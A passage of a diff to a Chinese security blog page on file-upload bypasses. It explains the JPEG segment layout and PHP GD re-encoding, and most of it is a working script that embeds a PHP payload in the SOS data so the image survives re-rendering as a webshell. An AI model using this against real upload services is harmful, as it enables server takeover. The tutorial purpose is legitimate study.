0x4c,</span><br><span class="line">    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">    0x66, 0x44, 0x50, 0x33</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">// 创建32x32真彩色图像</span><br><span class="line">$image = imagecreatetruecolor(32, 32);</span><br><span class="line"></span><br><span class="line">$dataLength = count($colorData);</span><br><span class="line">$pixelCount = 0;</span><br><span class="line"></span><br><span class="line">// 遍历颜色数据，每3个字节创建一个像素</span><br><span class="line">for ($i = 0; $i &lt; $dataLength; $i += 3) &#123;</span><br><span class="line">    // 确保有足够的数据创建RGB颜色</span><br><span class="line">    if ($i + 2 &lt; $dataLength) &#123;</span><br><span class="line">        $red = $colorData[$i];</span><br><span class="line">        $green = $colorData[$i + 1];</span><br><span class="line">        $blue = $colorData[$i + 2];</span><br><span class="line">        </span><br><span class="line">        // 分配颜色</span><br><span class="line">        $color = imagecolorallocate($image, $red, $green, $blue);</span><br><span class="line">        </span><br><span class="line">        // 计算x坐标（每3个字节一个像素）</span><br><span class="line">        $x = intval($pixelCount);</span><br><span class="line">        </span><br><span class="line">        // 在图像上设置像素（y坐标始终为0）</span><br><span class="line">        imagesetpixel($image, $x, 0, $color);</span><br><span class="line">        $pixelCount++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outputPath = &#x27;./1.png&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用010看下文件数据</p>
+<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/111.png" alt=" "></p>
+<p>将上传成功后的图片下载看下数据</p>
+<p><img src="/2025/12/08/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20251210220021_19_3.jpg" alt=" "></p>
+<p>成功将带有后门的png图片上传到服务器。</p>
+<h4 id="JPG图片文件"><a href="#JPG图片文件" class="headerlink" title="JPG图片文件"></a>JPG图片文件</h4><h5 id="JPG图片构成"><a href="#JPG图片构成" class="headerlink" title="JPG图片构成"></a>JPG图片构成</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">FFD8 (SOI - 图像开始)</span><br><span class="line">├── FFE0 (APP0 - JFIF应用段)</span><br><span class="line">├── FFDB (DQT - 量化表)</span><br><span class="line">├── FFC0 (SOF0 - 帧开始)</span><br><span class="line">├── FFC4 (DHT - 哈夫曼表)</span><br><span class="line">├── FFDA (SOS - 扫描开始)</span><br><span class="line">│   └── 压缩的图像数据</span><br><span class="line">└── FFD9 (EOI - 图像结束)</span><br></pre></td></tr></table></figure>
+
+<p>由于篇幅太大这里只详细介绍重要的部分</p>
+<p><strong>SOS（扫描行开始）</strong></p>
+<ul>
+<li><strong>标记码</strong>：<code>DA</code>；</li>
+<li><strong>核心作用</strong>：标识压缩图像数据的起始，关联Huffman表与颜色组件；</li>
+<li><strong>详细结构</strong>：</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>字段</strong></th>
+<th><strong>字节数</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>段标识</td>
+<td>1</td>
+<td>FF</td>
+</tr>
+<tr>
+<td>段类型</td>
+<td>1</td>
+<td>DA</td>
+</tr>
+<tr>
+<td>段长度</td>
+<td>2</td>
+<td><code>6 + 2×组件数量</code>（如3个组件时为<code>00 0C</code>&#x3D;12字节）</td>
+</tr>
+<tr>
+<td>组件数量</td>
+<td>1</td>
+<td>通常为3（YCbCr彩色图），1~4之间</td>
+</tr>
+<tr>
+<td>组件ID</td>
+<td>1</td>
+<td>1&#x3D;Y，2&#x3D;Cb，3&#x3D;Cr</td>
+</tr>
+<tr>
+<td>Huffman表号</td>
+<td>1</td>
+<td>0-3位&#x3D;AC表号，4-7位&#x3D;DC表号（如<code>00</code>&#x3D;AC表0、DC表0）</td>
+</tr>
+<tr>
+<td>剩余3字节</td>
+<td>3</td>
+<td>用途不明，解码时可忽略</td>
+</tr>
+</tbody></table>
+<ul>
+<li><strong>关键</strong>：SOS段后直接跟随压缩的图像数据（扫描行数据），按“左到右、上到下”顺序存储。</li>
+</ul>
+<p><strong>EOI（文件尾）</strong></p>
+<ul>
+<li><strong>标记码</strong>：<code>D9</code>；</li>
+<li><strong>结构</strong>：仅2字节，无长度和内容；</li>
+<li><strong>数据</strong>：<code>FF D9</code>（JPEG文件的结束标识，不可缺少）；</li>
+<li><strong>示例</strong>：二进制文件末尾必为<code>FF D9</code>，对应十六进制<code>00007bf0h: ... FF D9</code>。</li>
+</ul>
+<p>php后端对jpg图片的处理过程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// GD处理JPEG的过程</span><br><span class="line">$im = imagecreatefromjpeg($file);</span><br><span class="line">// 内部操作：</span><br><span class="line">// 1. 解析所有JPEG段</span><br><span class="line">// 2. 解压缩DCT系数</span><br><span class="line">// 3. 反量化</span><br><span class="line">// 4. 反离散余弦变换</span><br><span class="line">// 5. 得到RGB像素数据（完全解码）</span><br><span class="line"></span><br><span class="line">imagejpeg($im, $output);</span><br><span class="line">// 内部操作：</span><br><span class="line">// 1. 将RGB转换为YCbCr</span><br><span class="line">// 2. 离散余弦变换</span><br><span class="line">// 3. 使用默认量化表重新量化</span><br><span class="line">// 4. 使用默认哈夫曼表重新编码</span><br><span class="line">// 5. 生成全新的JPEG文件</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用方式-1"><a href="#利用方式-1" class="headerlink" title="利用方式"></a>利用方式</h5><p><code>imagecopyresized()</code>和<code>imagecopyresampled()</code>等函数在重新采样图像时：</p>
+<p>不完全重建JPEG流：可能保留部分原始压缩数据。</p>
+<p>不重新编码所有扫描数据：特别是DC系数可能被保留。</p>
+<p>容忍某些不规范数据：如果数据不影响图像显示，可能被原样复制。</p>
+<p>基于此可以利用脚本：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;gd&#x27;</span>) || !<span class="title function_ invoke__">function_exists</span>(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">set_error_handler</span>(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>()) &amp;&amp; (<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readShort</span>() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">skip</span>(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                <span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">eof</span>())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">readByte</span>() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;<span class="title function_ invoke__">seek</span>() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        <span class="title function_ invoke__">substr</span>(</span><br><span class="line">                            <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                <span class="title function_ invoke__">substr</span>(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">checkImage</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="title function_ invoke__">imagecreatefromjpeg</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>) || !<span class="title function_ invoke__">is_file</span>(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;size = <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;size - <span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">eof</span>()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="title function_ invoke__">ord</span>(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;binData = <span class="title function_ invoke__">substr</span>(<span class="variable">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (<span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + <span class="title function_ invoke__">ord</span>(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="variable language_">$this</span>-&gt;binData||(<span class="title function_ invoke__">strlen</span>(<span class="variable">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>对我们上传后的文件执行这段php代码就得到我们的jpg图片马。</p>
+
       
     </div>
 
@@ -735,14 +962,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">3k</span>
+    <span title="站点总字数">14k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2 分钟</span>
+    <span title="站点阅读时长">13 分钟</span>
   </span>
 </div>
 
